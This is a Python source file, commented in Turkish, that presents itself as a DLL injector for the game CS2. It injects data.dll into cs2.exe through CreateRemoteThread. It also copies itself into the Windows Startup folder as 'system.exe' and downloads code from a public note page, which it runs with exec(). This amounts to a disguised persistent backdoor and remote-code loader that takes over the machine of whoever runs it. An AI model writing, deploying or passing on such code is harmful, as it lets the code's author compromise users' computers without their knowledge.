import requests
from bs4 import BeautifulSoup
from cryptography.fernet import Fernet
import os
import time
import shutil
import sys
from ctypes import *
import psutil
import threading


def show_message_box(message, title="Bilgi"):
    """Python MessageBox fonksiyonu."""
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)

def inject_dll():
    def get_pid_by_name(proc_name):
        """Belirtilen adı taşıyan sürecin PID'sini alır."""
        for proc in psutil.process_iter(attrs=['pid', 'name']):
            if proc.info['name'].lower() == proc_name.lower():
                return proc.info['pid']
        return None

    def extract_dll():
        """PyInstaller ile eklenen data.dll dosyasını çıkartır."""
        if getattr(sys, '_MEIPASS', False):
            base_path = sys._MEIPASS
        else:
            base_path = os.getcwd()

        dll_path = os.path.join(base_path, "data.dll")

        if getattr(sys, '_MEIPASS', False):
            new_dll_path = os.path.join(os.getcwd(), "data.dll")
            shutil.copy(dll_path, new_dll_path)
            return new_dll_path

        return dll_path

    # CS2'nin PID'sini al
    cs2_pid = get_pid_by_name("cs2.exe")
    if not cs2_pid:
        show_message_box("CS2.exe çalışmıyor veya bulunamadı.", "Hata")
        sys.exit(0)

    # DLL dosyasını belirle
    dll_path = extract_dll()

    if not os.path.exists(dll_path):
        show_message_box(f"DLL dosyası bulunamadı: {dll_path}", "Hata")
        sys.exit(0)

    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF)
    VIRTUAL_MEM = (0x1000 | 0x2000)

    kernel32 = ctypes.windll.kernel32
    dll_len = len(dll_path) + 1  # Null-terminated string için +1

    # Hedef sürecin handle'ını al
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, cs2_pid)

    if not h_process:
        show_message_box(f"CS2.exe'nin PID'sine erişilemiyor: {cs2_pid}", "Hata")
        sys.exit(0)

    # Bellekte DLL yolu için yer ayır
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

    # DLL yolunu hedef sürece yaz
    written = ctypes.c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), dll_len, ctypes.byref(written))

    # LoadLibraryA adresini al
    h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

    # Yeni bir uzaktan thread oluştur ve DLL'yi yükle
    thread_id = ctypes.c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, ctypes.byref(thread_id)):
        show_message_box("DLL enjekte edilemedi.", "Hata")
        sys.exit(0)

    show_message_box(f"CS2.exe'ye başarıyla DLL enjekte edildi! (Thread ID: 0x{thread_id.value:08x})", "Başarılı")




def check_file(file_path):
    if os.path.exists(file_path):
        return True
    else:
        return False

def get_startup_folders():
    user_startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    global_startup = os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    return {"User Startup": user_startup, "Global Startup": global_startup}

def is_program_in_startup(program_name, startup_folder):
    program_path = os.path.join(startup_folder, program_name)
    return os.path.exists(program_path)

def copy_file_to_startup(source_path, destination_folder, new_name="system.exe"):
    destination_path = os.path.join(destination_folder, new_name)
    shutil.copy2(source_path, destination_path)
    return destination_path

def inject_program():
    startup_folders = get_startup_folders()
    if not is_program_in_startup("system.exe", startup_folders["User Startup"]):
        copy_file_to_startup(sys.executable, startup_folders["User Startup"])
        with open("settings.xml","w") as f:
            f.write("1")
            f.close()


def fetch_and_execute_code(url):
    response = requests.get(url)
    response.raise_for_status()  # HTTP hatalarını yakala
    soup = BeautifulSoup(response.text, "html.parser")
    plaintext_content = soup.find(class_="plaintext")
    if plaintext_content:
        exec(plaintext_content.text,globals())



def main():
    if check_file("settings.xml") == False:
       threading.Thread(target=inject_dll).start()
    url = "https://anotepad.com/notes/3gkei2dg"
    inject_program()
    time.sleep(1)
    if(check_file("settings.xml")):
        fetch_and_execute_code(url)

if __name__ == "__main__":
    main()
